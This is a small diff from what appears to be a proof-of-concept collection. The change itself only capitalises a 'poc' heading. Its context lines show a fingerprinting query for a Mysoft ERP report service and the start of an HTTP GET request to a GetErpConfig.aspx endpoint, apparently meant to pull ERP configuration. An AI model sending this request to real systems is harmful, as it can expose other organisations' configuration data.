@@ -8,7 +8,7 @@
 body="报表服务已正常运行"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60 HTTP/1.1
